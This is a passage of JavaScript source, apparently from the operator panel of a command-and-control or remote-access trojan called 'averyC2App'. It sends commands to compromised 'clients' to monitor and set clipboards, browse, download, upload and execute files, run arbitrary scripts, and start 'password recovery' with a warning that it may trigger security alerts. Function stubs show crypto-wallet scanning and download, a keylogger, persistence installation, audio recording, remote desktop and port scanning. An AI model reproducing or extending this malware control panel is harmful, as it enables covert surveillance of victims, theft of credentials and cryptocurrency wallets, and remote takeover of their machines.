setClipboard() {
    const data = document.getElementById('clipboardInput').value;
    if (!data) {
        alert('Please enter text to set clipboard');
        return;
    }
    
    this.ws.send(JSON.stringify({
        type: 'set_clipboard',
        client_id: this.selectedClient,
        clipboard_data: data
    }));
}

clearClipboardInput() {
    document.getElementById('clipboardInput').value = '';
}

toggleClipboardMonitor() {
    const btn = document.getElementById('clipboardMonitorBtn');
    
    if (this.clipboardMonitoring) {
        this.ws.send(JSON.stringify({
            type: 'stop_clipboard_monitor',
            client_id: this.selectedClient
        }));
        btn.textContent = 'START MONITOR';
        btn.classList.remove('active');
    } else {
        this.ws.send(JSON.stringify({
            type: 'start_clipboard_monitor',
            client_id: this.selectedClient
        }));
        btn.textContent = 'STOP MONITOR';
        btn.classList.add('active');
    }
    
    this.clipboardMonitoring = !this.clipboardMonitoring;
}

handleClipboardData(data) {
    document.getElementById('clipboardInput').value = data.data || '';
    this.addClipboardHistory(data.data || 'Empty clipboard');
}

handleClipboardSetResult(data) {
    if (data.success) {
        this.addTerminalOutput('>>> Clipboard set successfully', 'success');
    } else {
        this.addTerminalOutput('>>> Failed to set clipboard', 'error');
    }
}

handleClipboardChanged(data) {
    this.addClipboardHistory(data.data, new Date(data.timestamp * 1000));
    
    // Flash notification
    const input = document.getElementById('clipboardInput');
    input.value = data.data;
    input.style.borderColor = '#ffff00';
    setTimeout(() => {
        input.style.borderColor = '';
    }, 500);
}

addClipboardHistory(content, timestamp = new Date()) {
    const historyList = document.getElementById('clipboardHistory');
    
    const item = document.createElement('div');
    item.className = 'history-item';
    item.innerHTML = `
        <div class="history-time">${timestamp.toLocaleString()}</div>
        <div class="history-content">${this.escapeHtml(content)}</div>
    `;
    
    item.addEventListener('click', () => {
        document.getElementById('clipboardInput').value = content;
    });
    
    historyList.insertBefore(item, historyList.firstChild);
    
    // Keep only last 50 items
    while (historyList.children.length > 50) {
        historyList.removeChild(historyList.lastChild);
    }
}

escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
            
            // File Manager Methods
            openFileManager() {
                if (!this.selectedClient) {
                    this.addTerminalOutput('>>> No client selected for file manager', 'error');
                    return;
                }
                
                document.getElementById('fmClientId').textContent = this.selectedClient;
                document.getElementById('fmModal').style.display = 'flex';
                this.isSearching = false; // Reset search state
                
                // Get drives and initial directory
                this.ws.send(JSON.stringify({
                    type: 'fm_get_drives',
                    client_id: this.selectedClient
                }));
                
                // Navigate to C:\ by default
                this.currentPath = 'C:\\';
                document.getElementById('fmPathInput').value = this.currentPath;
                this.refreshFiles();
                
                this.addTerminalOutput(`>>> Opening file manager for ${this.selectedClient}`, 'system');
            }
            
            handleFmDrives(data) {
                const driveSelect = document.getElementById('fmDriveSelect');
                driveSelect.innerHTML = '';
                
                if (data.drives && data.drives.length > 0) {
                    data.drives.forEach(drive => {
                        const option = document.createElement('option');
                        option.value = drive;
                        option.textContent = drive;
                        driveSelect.appendChild(option);
                    });
                    
                    // Update current path if needed to match first drive
                    if (data.drives.length > 0) {
                        const firstDrive = data.drives[0];
                        this.currentPath = firstDrive.endsWith(':') ? firstDrive + '\\' : firstDrive;
                        document.getElementById('fmPathInput').value = this.currentPath;
                    }
                }
            }
            
            handleFmFiles(data) {
                this.fileList = data.files || [];
                
                // Update current path from server response if available
                if (data.path) {
                    this.currentPath = data.path;
                    document.getElementById('fmPathInput').value = this.currentPath;
                }
                
                const filesContainer = document.getElementById('fmFiles');
                filesContainer.innerHTML = '';
                
                // Add parent directory if not at root
                if (this.currentPath.length > 3) {
                    const parentItem = this.createFileItem({
                        name: '..',
                        type: 'directory',
                        size: 0,
                        modified: '',
                        isParent: true
                    });
                    filesContainer.appendChild(parentItem);
                }
                
                // Sort: directories first, then files
                this.fileList.sort((a, b) => {
                    if (a.type === 'directory' && b.type !== 'directory') return -1;
                    if (a.type !== 'directory' && b.type === 'directory') return 1;
                    return a.name.toLowerCase().localeCompare(b.name.toLowerCase());
                });
                
                // Add all files
                this.fileList.forEach(file => {
                    const item = this.createFileItem(file);
                    filesContainer.appendChild(item);
                });
                
                this.updateFmStatus(`Loaded ${this.fileList.length} items in ${this.currentPath}`);
            }
            
            createFileItem(file) {
                const item = document.createElement('div');
                item.className = 'fm-item';
                item.dataset.fileName = file.name;
                item.dataset.fileType = file.type;
                
                const icon = file.type === 'directory' ? '' : 
                           file.name.endsWith('.exe') ? '' :
                           file.name.endsWith('.zip') || file.name.endsWith('.rar') ? '' :
                           file.name.match(/\.(jpg|jpeg|png|gif|bmp)$/i) ? '' :
                           file.name.match(/\.(mp4|avi|mkv|mov)$/i) ? '' :
                           file.name.match(/\.(mp3|wav|flac|ogg)$/i) ? '' :
                           file.name.match(/\.(txt|log|md)$/i) ? '' :
                           file.name.match(/\.(doc|docx|pdf)$/i) ? '' : '';
                
                const ext = file.name.lastIndexOf('.') > -1 ? 
                           file.name.substring(file.name.lastIndexOf('.') + 1).toUpperCase() : 
                           file.type === 'directory' ? 'FOLDER' : 'FILE';
                
                item.innerHTML = `
                    <div class="fm-item-icon">${icon}</div>
                    <div class="fm-item-name">${file.name}</div>
                    <div class="fm-item-size">${this.formatFileSize(file.size)}</div>
                    <div class="fm-item-date">${file.modified || ''}</div>
                    <div class="fm-item-type">${ext}</div>
                `;
                
                item.addEventListener('click', () => this.selectFile(file));
                item.addEventListener('dblclick', () => this.openFile(file));
                
                return item;
            }
            
            formatFileSize(bytes) {
                if (bytes === 0) return '';
                const sizes = ['B', 'KB', 'MB', 'GB'];
                const i = Math.floor(Math.log(bytes) / Math.log(1024));
                return Math.round(bytes / Math.pow(1024, i) * 100) / 100 + ' ' + sizes[i];
            }
            
            selectFile(file) {
                // Clear previous selection
                document.querySelectorAll('.fm-item.selected').forEach(item => {
                    item.classList.remove('selected');
                });
                
                // Select new file
                const item = document.querySelector(`[data-file-name="${file.name}"]`);
                if (item) {
                    item.classList.add('selected');
                    this.selectedFmFile = file;
                    
                    // Update buttons
                    document.getElementById('fmExecuteBtn').disabled = file.type === 'directory';
                    document.getElementById('fmDownloadBtn').disabled = file.type === 'directory';
                    document.getElementById('fmZipBtn').disabled = false; // Enable ZIP for both files and folders
                    
                    // Update status
                    document.getElementById('fmSelectedInfo').textContent = 
                        `Selected: ${file.name} (${file.type})`;
                }
            }
            
            openFile(file) {
                if (file.isParent) {
                    this.navigateUp();
                } else if (file.type === 'directory') {
                    // Ensure proper path separator
                    let newPath = this.currentPath;
                    if(this.isSearching) { // If we are in search view, use the file's full path
                        newPath = file.path.substring(0, file.path.lastIndexOf('\\') + 1);
                        this.isSearching = false; // Exit search mode
                    } else {
                         if (!newPath.endsWith('\\') && !newPath.endsWith('/')) {
                            newPath += '\\';
                        }
                        newPath += file.name;
                    }
                    
                    this.currentPath = newPath;
                    document.getElementById('fmPathInput').value = this.currentPath;
                    this.refreshFiles();
                } else if (file.name.match(/\.(exe|bat|cmd|ps1|sh)$/i)) {
                    this.executeSelected();
                }
            }
            
            changeDrive() {
                const drive = document.getElementById('fmDriveSelect').value;
                this.currentPath = drive.endsWith(':') ? drive + '\\' : drive;
                document.getElementById('fmPathInput').value = this.currentPath;
                this.refreshFiles();
            }
            
            navigateToPath() {
                const newPath = document.getElementById('fmPathInput').value.trim();
                if (newPath && newPath !== this.currentPath) {
                    this.currentPath = newPath;
                    this.refreshFiles();
                }
            }
            
            navigateUp() {
                // If in search view, go back to normal view of current path
                if(this.isSearching) {
                    this.isSearching = false;
                    this.refreshFiles();
                    return;
                }
                const parts = this.currentPath.replace(/[\\\/]+$/, '').split(/[\\\/]/);
                if (parts.length > 1) {
                    parts.pop();
                    this.currentPath = parts.join('\\') + '\\';
                    document.getElementById('fmPathInput').value = this.currentPath;
                    this.refreshFiles();
                }
            }
            
            refreshFiles() {
                this.isSearching = false;
                this.updateFmStatus('Loading files...');
                this.ws.send(JSON.stringify({
                    type: 'fm_list_files',
                    client_id: this.selectedClient,
                    path: this.currentPath
                }));
            }

            searchFiles() {
                const pattern = document.getElementById('fmSearchInput').value;
                if (!pattern.trim()) {
                    this.updateFmStatus('Please enter a search pattern.');
                    return;
                }
                this.isSearching = true;
                this.updateFmStatus(`Searching for "${pattern}" in ${this.currentPath}...`);
                document.getElementById('fmFiles').innerHTML = '<div class="loading">Searching...</div>';
                document.getElementById('fmStopSearchBtn').style.display = 'inline-block';

                this.ws.send(JSON.stringify({
                    type: 'fm_search',
                    client_id: this.selectedClient,
                    path: this.currentPath,
                    pattern: pattern
                }));
            }

            stopSearch() {
                if (!this.isSearching) return;
                this.ws.send(JSON.stringify({
                    type: 'fm_stop_search',
                    client_id: this.selectedClient
                }));
                this.handleFmSearchComplete({message: "Search stopped by user."});
            }

            handleFmSearchResult(data) {
                if (!this.isSearching) return; // Ignore results if we've stopped searching

                const filesContainer = document.getElementById('fmFiles');
                if (filesContainer.querySelector('.loading')) {
                    filesContainer.innerHTML = ''; // Clear "Searching..." message
                }
                
                const item = this.createFileItem(data.file);
                // Modify the double click to go to the file's directory
                item.addEventListener('dblclick', () => {
                    const filePath = data.file.path;
                    this.currentPath = filePath.substring(0, filePath.lastIndexOf('\\') + 1);
                    document.getElementById('fmPathInput').value = this.currentPath;
                    this.isSearching = false;
                    this.refreshFiles();
                });

                filesContainer.appendChild(item);
            }

            handleFmSearchComplete(data) {
                this.isSearching = false;
                this.updateFmStatus(data.message);
                document.getElementById('fmStopSearchBtn').style.display = 'none';

                const filesContainer = document.getElementById('fmFiles');
                if (filesContainer.querySelector('.loading')) {
                    filesContainer.innerHTML = '<div class="no-results">No files found matching the pattern.</div>';
                }
            }
            
            executeSelected() {
                if (!this.selectedFmFile || this.selectedFmFile.type === 'directory') return;
                
                let fullPath = this.currentPath;
                if (!fullPath.endsWith('\\') && !fullPath.endsWith('/')) {
                    fullPath += '\\';
                }
                fullPath += this.selectedFmFile.name;
                
                this.updateFmStatus(`Executing ${this.selectedFmFile.name}...`);
                
                this.ws.send(JSON.stringify({
                    type: 'fm_execute',
                    client_id: this.selectedClient,
                    path: fullPath
                }));
            }
            
            zipCurrent() {
                if (!this.selectedFmFile) {
                    this.updateFmStatus('Please select a file or folder to ZIP');
                    return;
                }
                
                // Build full path of selected item
                let fullPath = this.currentPath;
                if (!fullPath.endsWith('\\') && !fullPath.endsWith('/')) {
                    fullPath += '\\';
                }
                fullPath += this.selectedFmFile.name;
                
                this.updateFmStatus(`Creating ZIP archive for ${this.selectedFmFile.name}...`);
                document.getElementById('fmZipBtn').disabled = true;
                
                this.ws.send(JSON.stringify({
                    type: 'fm_zip_folder',
                    client_id: this.selectedClient,
                    path: fullPath  // Send full path of selected item
                }));
            }
            
            downloadSelected() {
                if (!this.selectedFmFile || this.selectedFmFile.type === 'directory') return;
                
                // Prevent multiple downloads
                if (document.getElementById('fmProgressModal').style.display === 'block') {
                    this.updateFmStatus('Download already in progress');
                    return;
                }
                
                let fullPath = this.currentPath;
                if (!fullPath.endsWith('\\') && !fullPath.endsWith('/')) {
                    fullPath += '\\';
                }
                fullPath += this.selectedFmFile.name;
                
                this.downloadFileName = this.selectedFmFile.name;
                this.downloadChunks.clear(); // Clear the Map
                this.downloadTotalChunks = 0;
                this.downloadExpectedSize = this.selectedFmFile.size || 0;
                
                // Show progress modal
                document.getElementById('fmProgressModal').style.display = 'block';
                document.getElementById('fmProgressTitle').textContent = 'Downloading File';
                document.getElementById('fmProgressInfo').textContent = `${this.selectedFmFile.name} (${this.formatFileSize(this.downloadExpectedSize)})`;
                document.getElementById('fmProgressBar').style.width = '0%';
                document.getElementById('fmProgressText').textContent = '0%';
                
                console.log(`Starting download: ${this.downloadFileName}`);
                
                this.ws.send(JSON.stringify({
                    type: 'fm_download_file',
                    client_id: this.selectedClient,
                    path: fullPath
                }));
            }
            
            handleFmFileSelect(event) {
                const file = event.target.files[0];
                if (!file) return;
                
                const maxSize = 50 * 1024 * 1024; // 50MB
                
                if (file.size > maxSize) {
                    this.updateFmStatus(`ERROR: File too large (${(file.size / 1024 / 1024).toFixed(2)}MB). Max size is 50MB.`);
                    event.target.value = '';
                    return;
                }
                
                // Show progress modal
                document.getElementById('fmProgressModal').style.display = 'block';
                document.getElementById('fmProgressTitle').textContent = 'Uploading File';
                document.getElementById('fmProgressInfo').textContent = file.name;
                document.getElementById('fmProgressBar').style.width = '0%';
                document.getElementById('fmProgressText').textContent = '0%';
                
                // Read and upload file
                const reader = new FileReader();
                reader.onload = async (e) => {
                    const base64Data = e.target.result.split(',')[1];
                    const chunkSize = 512 * 1024; // 512KB chunks
                    const totalChunks = Math.ceil(base64Data.length / chunkSize);
                    
                    // Send file info
                    this.ws.send(JSON.stringify({
                        type: 'fm_upload_start',
                        client_id: this.selectedClient,
                        path: this.currentPath,
                        filename: file.name,
                        filesize: file.size,
                        total_chunks: totalChunks
                    }));
                    
                    // Upload chunks
                    for (let i = 0; i < totalChunks; i++) {
                        const chunk = base64Data.slice(i * chunkSize, (i + 1) * chunkSize);
                        const progress = Math.round(((i + 1) / totalChunks) * 100);
                        
                        document.getElementById('fmProgressBar').style.width = progress + '%';
                        document.getElementById('fmProgressText').textContent = progress + '%';
                        
                        await this.sendFmFileChunk(i, chunk, i === totalChunks - 1);
                        await new Promise(resolve => setTimeout(resolve, 25));
                    }
                };
                
                reader.readAsDataURL(file);
                event.target.value = '';
            }
            
            async sendFmFileChunk(chunkIndex, chunkData, isLast) {
                return new Promise((resolve) => {
                    this.ws.send(JSON.stringify({
                        type: 'fm_upload_chunk',
                        client_id: this.selectedClient,
                        chunk_index: chunkIndex,
                        chunk_data: chunkData,
                        is_last: isLast
                    }));
                    setTimeout(resolve, 5);
                });
            }
            
            handleFmOperationResult(data) {
                this.updateFmStatus(data.message);
                
                if (data.operation === 'execute') {
                    if (data.success) {
                        this.addTerminalOutput(`>>> File executed: ${data.message}`, 'success');
                    }
                } else if (data.operation === 'zip') {
                    document.getElementById('fmZipBtn').disabled = false;
                    if (data.success) {
                        this.refreshFiles(); // Refresh to show new ZIP file
                    }
                } else if (data.operation === 'upload') {
                    document.getElementById('fmProgressModal').style.display = 'none';
                    if (data.success) {
                        this.refreshFiles(); // Refresh to show uploaded file
                    }
                }
            }
            
            handleFmDownloadStart(data) {
                this.downloadFileName = data.filename;
                this.downloadChunks.clear();
                this.downloadTotalChunks = 0;
                this.downloadExpectedSize = data.size || 0;
                
                console.log(`Download started: ${data.filename} (${data.size} bytes)`);
                this.updateFmStatus(`Starting download: ${data.filename}`);
            }
            
            handleFmDownloadChunk(data) {
                // Store chunk in Map for reliable ordering
                this.downloadChunks.set(data.chunk_index, data.chunk_data);
                this.downloadTotalChunks = data.total_chunks;
                
                const progress = Math.round(((data.chunk_index + 1) / data.total_chunks) * 100);
                document.getElementById('fmProgressBar').style.width = progress + '%';
                document.getElementById('fmProgressText').textContent = progress + '%';
                
                console.log(`Download chunk ${data.chunk_index + 1}/${data.total_chunks} (${progress}%) - Size: ${data.chunk_data.length}`);
                
                // Check if we have all chunks
                if (this.downloadChunks.size >= this.downloadTotalChunks) {
                    this.finalizeDownload();
                }
            }
            
            finalizeDownload() {
                console.log(`Finalizing download: ${this.downloadChunks.size}/${this.downloadTotalChunks} chunks`);
                
                // Combine chunks in correct order
                let fullData = '';
                for (let i = 0; i < this.downloadTotalChunks; i++) {
                    if (this.downloadChunks.has(i)) {
                        fullData += this.downloadChunks.get(i);
                    } else {
                        console.error(`Missing chunk ${i} in download`);
                        this.updateFmStatus(`Download failed: Missing chunk ${i}`);
                        document.getElementById('fmProgressModal').style.display = 'none';
                        return;
                    }
                }
                
                if (fullData.length === 0) {
                    console.error('No data reconstructed for download');
                    this.updateFmStatus('Download failed: No data received');
                    document.getElementById('fmProgressModal').style.display = 'none';
                    return;
                }
                
                console.log(`Combined data length: ${fullData.length} characters`);
                
                // Validate base64 data before creating blob
                try {
                    // Test decode a small portion first
                    const testChunk = fullData.substring(0, Math.min(1000, fullData.length));
                    atob(testChunk);
                    
                    // If test passes, decode the full data
                    const binaryData = atob(fullData);
                    const bytes = new Uint8Array(binaryData.length);
                    for (let i = 0; i < binaryData.length; i++) {
                        bytes[i] = binaryData.charCodeAt(i);
                    }
                    
                    const blob = new Blob([bytes]);
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = this.downloadFileName;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                    
                    this.updateFmStatus(`Download complete: ${this.downloadFileName} (${bytes.length} bytes)`);
                    console.log(`Download successful: ${this.downloadFileName} (${bytes.length} bytes)`);
                } catch (error) {
                    console.error('Download base64 decode error:', error);
                    this.updateFmStatus(`Download failed: Invalid data encoding - ${error.message}`);
                }
                
                document.getElementById('fmProgressModal').style.display = 'none';
                
                // Clean up
                this.downloadChunks.clear();
                this.downloadTotalChunks = 0;
            }
            
            handleFmDownloadComplete(data) {
                document.getElementById('fmProgressModal').style.display = 'none';
                
                if (data.success) {
                    // Server-side finalization completed
                    if (data.saved_name) {
                        this.updateFmStatus(`Download completed and saved as: ${data.saved_name}`);
                    }
                    
                    // If we haven't finalized locally yet, try now
                    if (this.downloadChunks.size > 0 && this.downloadTotalChunks > 0) {
                        this.finalizeDownload();
                    }
                } else {
                    this.updateFmStatus(`Download failed: ${data.error || 'Unknown error'}`);
                    console.error('Download failed:', data.error);
                }
                
                // Clean up
                this.downloadChunks.clear();
                this.downloadTotalChunks = 0;
            }
            
            updateFmStatus(message) {
                document.getElementById('fmStatusText').textContent = message;
            }
            
            handlePathKeypress(event) {
                if (event.key === 'Enter') {
                    this.navigateToPath();
                }
            }

            openTrollPanel() {
                if (!this.selectedClient) {
                    this.addTerminalOutput('>>> No client selected for Troll Panel', 'error');
                    return;
                }
                
                document.getElementById('trollClientId').textContent = this.selectedClient;
                document.getElementById('trollModal').style.display = 'flex';
                
                this.addTerminalOutput(`>>> Opening Troll Panel for ${this.selectedClient}`, 'system');
            }

            sendTroll(trollType) {
                if (!this.selectedClient) return;

                let payload = {
                    type: 'send_troll',
                    client_id: this.selectedClient,
                    troll_type: trollType
                };

                switch(trollType) {
                    case 'messagebox':
                        payload.title = document.getElementById('trollMsgTitle').value;
                        payload.text = document.getElementById('trollMsgText').value;
                        if (!payload.text) {
                            alert('Message text cannot be empty.');
                            return;
                        }
                        break;
                    case 'open_url':
                        payload.url = document.getElementById('trollUrl').value;
                         if (!payload.url) {
                            alert('URL cannot be empty.');
                            return;
                        }
                        break;
                    case 'tts':
                        payload.text = document.getElementById('trollTtsText').value;
                        if (!payload.text) {
                            alert('Text to speak cannot be empty.');
                            return;
                        }
                        break;
                    default:
                        return;
                }

                this.ws.send(JSON.stringify(payload));
                this.addTerminalOutput(`>>> Sent troll command: ${trollType}`, 'system');
            }
            
            handleTrollResponse(data) {
                if (data.success) {
                    this.addTerminalOutput(`>>> Troll command '${data.troll_type}' executed successfully.`, 'success');
                } else {
                    this.addTerminalOutput(`>>> Troll command '${data.troll_type}' failed: ${data.error}`, 'error');
                }
            }

            openSysInfoPanel() {
                if (!this.selectedClient) {
                    this.addTerminalOutput('>>> No client selected for System Information', 'error');
                    return;
                }
                
                document.getElementById('sysInfoClientId').textContent = this.selectedClient;
                document.getElementById('sysInfoModal').style.display = 'flex';
                this.switchSysInfoTab('general', true); // Open to general tab first
                
                // Request data
                this.ws.send(JSON.stringify({
                    type: 'get_sysinfo',
                    client_id: this.selectedClient
                }));
            }

            handleSysInfoResponse(data) {
                if (data.info) {
                    this.sysInfoData = data.info;
                    this.switchSysInfoTab('general', true, true); // Re-render the general tab with data
                } else {
                    document.getElementById('sysInfoContent').innerHTML = `<div class="loading">Failed to load system info: ${data.error || 'Unknown error'}</div>`;
                }
            }
            
            switchSysInfoTab(tabName, isInitial = false, forceRender = false) {
                // Set active tab class
                if (!isInitial) {
                    document.querySelectorAll('.sysinfo-tab').forEach(tab => tab.classList.remove('active'));
                    event.target.classList.add('active');
                }

                // Only render if we have data or are forcing a render (like on initial load)
                if (!this.sysInfoData && !forceRender) {
                    return;
                }

                const contentDiv = document.getElementById('sysInfoContent');
                if (!this.sysInfoData && forceRender) {
                    contentDiv.innerHTML = '<div class="loading">Loading system information...</div>';
                    return;
                }

                let html = '';
                switch(tabName) {
                    case 'general':
                        html = `
                            <div class="sysinfo-grid">
                                <div class="sysinfo-label">Hostname:</div><div class="sysinfo-value">${this.sysInfoData.hostname || ''}</div>
                                <div class="sysinfo-label">OS:</div><div class="sysinfo-value">${this.sysInfoData.os || ''}</div>
                                <div class="sysinfo-label">Username:</div><div class="sysinfo-value">${this.sysInfoData.username || ''}</div>
                                <div class="sysinfo-label">Uptime:</div><div class="sysinfo-value">${this.sysInfoData.uptime || ''}</div>
                            </div>
                        `;
                        break;
                    case 'hardware':
                         html = `
                            <div class="sysinfo-grid">
                                <div class="sysinfo-label">CPU:</div><div class="sysinfo-value">${this.sysInfoData.cpu || ''}</div>
                                <div class="sysinfo-label">Cores:</div><div class="sysinfo-value">${this.sysInfoData.cores || ''}</div>
                                <div class="sysinfo-label">RAM:</div><div class="sysinfo-value">${this.sysInfoData.ram || ''}</div>
                                <div class="sysinfo-label">Drives:</div><div class="sysinfo-value">${(this.sysInfoData.drives || []).join('<br>')}</div>
                            </div>
                        `;
                        break;
                    case 'software':
                        html = `<table class="sysinfo-table"><thead><tr><th>Name</th><th>Version</th></tr></thead><tbody>`;
                        (this.sysInfoData.software || []).forEach(s => {
                            html += `<tr><td>${s.name}</td><td>${s.version}</td></tr>`;
                        });
                        html += `</tbody></table>`;
                        break;
                    case 'network':
                        html = `<table class="sysinfo-table"><thead><tr><th>Interface</th><th>MAC</th><th>IPs</th></tr></thead><tbody>`;
                        (this.sysInfoData.network || []).forEach(n => {
                            html += `<tr><td>${n.name}</td><td>${n.mac}</td><td>${(n.ips || []).join('<br>')}</td></tr>`;
                        });
                        html += `</tbody></table>`;
                        break;
                }
                contentDiv.innerHTML = html;
            }

            openScriptPanel() {
                if (!this.selectedClient) {
                    this.addTerminalOutput('>>> No client selected for Script Execution', 'error');
                    return;
                }
                
                document.getElementById('scriptClientId').textContent = this.selectedClient;
                document.getElementById('scriptModal').style.display = 'flex';
                document.getElementById('scriptOutput').innerHTML = ' SCRIPT OUTPUT ';
            }

            executeCustomScript() {
                if (!this.selectedClient) return;

                const scriptType = document.getElementById('scriptType').value;
                const scriptContent = document.getElementById('scriptEditor').value;

                if (!scriptContent.trim()) {
                    alert('Script content cannot be empty.');
                    return;
                }

                document.getElementById('scriptOutput').innerHTML = 'Executing script...';

                this.ws.send(JSON.stringify({
                    type: 'execute_script',
                    client_id: this.selectedClient,
                    script_type: scriptType,
                    script_content: scriptContent
                }));
            }
            
            handleScriptResponse(data) {
                const outputDiv = document.getElementById('scriptOutput');
                if (data.success) {
                    outputDiv.textContent = data.output;
                } else {
                    outputDiv.textContent = `ERROR: ${data.error}\n\n${data.output}`;
                }
                outputDiv.scrollTop = outputDiv.scrollHeight;
            }

            startPasswordRecovery() {
                if (!this.selectedClient) {
                    this.addTerminalOutput('>>> No client selected for Password Recovery', 'error');
                    return;
                }

                if (!confirm(`Start password recovery on client ${this.selectedClient}? This may trigger security alerts.`)) {
                    return;
                }

                this.addTerminalOutput(`>>> Starting password recovery on ${this.selectedClient}...`, 'system');
                this.ws.send(JSON.stringify({
                    type: 'start_password_recovery',
                    client_id: this.selectedClient
                }));
            }

            handlePasswordRecoveryComplete(data) {
                this.addTerminalOutput(`>>> Password recovery complete for ${data.client_id}.`, 'success');
                if(data.path) {
                    this.addTerminalOutput(`>>> Files saved to: ${data.path}`, 'system');
                    this.addTerminalOutput(`>>> Opening File Manager at recovery location...`, 'system');
                    
                    // Automatically open file manager to the path
                    this.openFileManager();
                    
                    // Give a slight delay for the modal to open, then navigate
                    setTimeout(() => {
                        document.getElementById('fmPathInput').value = data.path;
                        this.navigateToPath();
                    }, 500);
                } else {
                     this.addTerminalOutput(`>>> No recovery path returned from client.`, 'error');
                }
            }
        }




        function closeWalletModal() {
    document.getElementById('walletModal').style.display = 'none';
}

function startWalletScan() {
    const app = window.averyC2App;
    if (app) app.startWalletScan();
}

function filterWallets(filter) {
    const app = window.averyC2App;
    if (app) app.filterWallets(filter);
}

function downloadWallet(index) {
    const app = window.averyC2App;
    if (app) app.downloadWallet(index);
}

        function closeKeyloggerModal() {
    document.getElementById('keyloggerModal').style.display = 'none';
}

function closePersistenceModal() {
    document.getElementById('persistenceModal').style.display = 'none';
}

function checkPersistence() {
    const app = window.averyC2App;
    if (app) app.checkPersistence();
}

function installPersistence(method) {
    const app = window.averyC2App;
    if (app) app.installPersistence(method);
}

function removeAllPersistence() {
    const app = window.averyC2App;
    if (app) app.removeAllPersistence();
}

function closeAudioModal() {
    const app = window.averyC2App;
    if (app && app.audioRecording) {
        app.stopRecording();
    }
    document.getElementById('audioModal').style.display = 'none';
}

function refreshAudioDevices() {
    const app = window.averyC2App;
    if (app) app.refreshAudioDevices();
}

function toggleRecording() {
    const app = window.averyC2App;
    if (app) app.toggleRecording();
}

function playAudioRecording(index) {
    const app = window.averyC2App;
    if (app) app.playAudioRecording(index);
}

function downloadAudioRecording(index) {
    const app = window.averyC2App;
    if (app) app.downloadAudioRecording(index);
}
function closeNetworkModal() {
    const app = window.averyC2App;
    if (app && app.netstatMonitoring) {
        app.toggleNetstatMonitor(); // Stop monitoring when closing
    }
    document.getElementById('networkModal').style.display = 'none';
}

function switchNetworkTab(tab) {
    const app = window.averyC2App;
    if (app) app.switchNetworkTab(tab);
}

function refreshConnections() {
    const app = window.averyC2App;
    if (app) app.refreshConnections();
}

function filterConnections(event) {
    const app = window.averyC2App;
    if (app) app.filterConnections(event);
}

function closeSelectedConnection() {
    const app = window.averyC2App;
    if (app) app.closeSelectedConnection();
}

function toggleNetstatMonitor() {
    const app = window.averyC2App;
    if (app) app.toggleNetstatMonitor();
}

function startPortScan() {
    const app = window.averyC2App;
    if (app) app.startPortScan();
}

function stopPortScan() {
    const app = window.averyC2App;
    if (app) app.stopPortScan();
}

function setScanPreset(preset) {
    const app = window.averyC2App;
    if (app) app.setScanPreset(preset);
}


function closeRegistryModal() {
    document.getElementById('registryModal').style.display = 'none';
}

function navigateRegistry() {
    const app = window.averyC2App;
    if (app) app.navigateRegistry();
}

function refreshRegistry() {
    const app = window.averyC2App;
    if (app) app.refreshRegistry();
}

function showAddValueDialog() {
    const app = window.averyC2App;
    if (app) app.showAddValueDialog();
}

function hideAddValueDialog() {
    const app = window.averyC2App;
    if (app) app.hideAddValueDialog();
}

function saveRegistryValue() {
    const app = window.averyC2App;
    if (app) app.saveRegistryValue();
}

function deleteRegistryItem() {
    const app = window.averyC2App;
    if (app) app.deleteRegistryItem();
}

function toggleKeylogger() {
    const app = window.averyC2App;
    if (app) app.toggleKeylogger();
}

function getKeylog() {
    const app = window.averyC2App;
    if (app) app.getKeylog();
}

function clearKeylog() {
    const app = window.averyC2App;
    if (app) app.clearKeylog();
}

function exportKeylog() {
    const app = window.averyC2App;
    if (app) app.exportKeylog();
}
        
function closeClipboardModal() {
    document.getElementById('clipboardModal').style.display = 'none';
}

function getClipboard() {
    const app = window.averyC2App;
    if (app) app.getClipboard();
}

function setClipboard() {
    const app = window.averyC2App;
    if (app) app.setClipboard();
}

function clearClipboardInput() {
    const app = window.averyC2App;
    if (app) app.clearClipboardInput();
}

function toggleClipboardMonitor() {
    const app = window.averyC2App;
    if (app) app.toggleClipboardMonitor();
}
function closeProcessModal() {
    document.getElementById('processModal').style.display = 'none';
}

function refreshProcesses() {
    const app = window.averyC2App;
    if (app) app.refreshProcesses();
}

function searchProcesses(event) {
    const app = window.averyC2App;
    if (app) app.searchProcesses(event);
}

function killSelectedProcess() {
    const app = window.averyC2App;
    if (app) app.killSelectedProcess();
}

function setProcessPriority() {
    const app = window.averyC2App;
    if (app) app.setProcessPriority();
}

function showStartProcessDialog() {
    const app = window.averyC2App;
    if (app) app.showStartProcessDialog();
}

function hideStartProcessDialog() {
    const app = window.averyC2App;
    if (app) app.hideStartProcessDialog();
}

function startNewProcess() {
    const app = window.averyC2App;
    if (app) app.startNewProcess();
}

function getProcessDetails() {
    const app = window.averyC2App;
    if (app) app.getProcessDetails();
}

function hideProcessDetails() {
    const app = window.averyC2App;
    if (app) app.hideProcessDetails();
}

        // Global functions for modal controls
        function closeRdpModal() {
            const app = window.averyC2App;
            if (app) {
                app.stopRemoteDesktop();
            }
            document.getElementById('rdpModal').style.display = 'none';
        }
        
        function startRemoteDesktop() {
            const app = window.averyC2App;
            if (app) {
                app.startRemoteDesktop();
            }
        }
        
        function stopRemoteDesktop() {
            const app = window.averyC2App;
            if (app) {
                app.stopRemoteDesktop();
            }
        }
        
        function changeQuality() {
            const app = window.averyC2App;
            if (app && app.rdpActive) {
                // Restart with new quality
                app.stopRemoteDesktop();
                setTimeout(() => {
                    app.startRemoteDesktop();
                }, 500);
            }
        }
        
        function closeExecModal() {
            document.getElementById('execModal').style.display = 'none';
        }
        
        function handleFileSelect(event) {
            const app = window.averyC2App;
            if (app) {
                app.handleFileSelect(event);
            }
        }
        
        function uploadFile() {
            const app = window.averyC2App;
            if (app) {
                app.uploadFile();
            }
        }
        
        function executeFile() {
            const app = window.averyC2App;
            if (app) {
                app.executeFile();
            }
        }
        
        // File Manager functions
        function closeFmModal() {
            document.getElementById('fmModal').style.display = 'none';
        }
        
        function changeDrive() {
            const app = window.averyC2App;
            if (app) {
                app.changeDrive();
            }
        }
        
        function navigateToPath() {
            const app = window.averyC2App;
            if (app) {
                app.navigateToPath();
            }
        }
        
        function navigateUp() {
            const app = window.averyC2App;
            if (app) {
                app.navigateUp();
            }
        }
        
        function refreshFiles() {
            const app = window.averyC2App;
            if (app) {
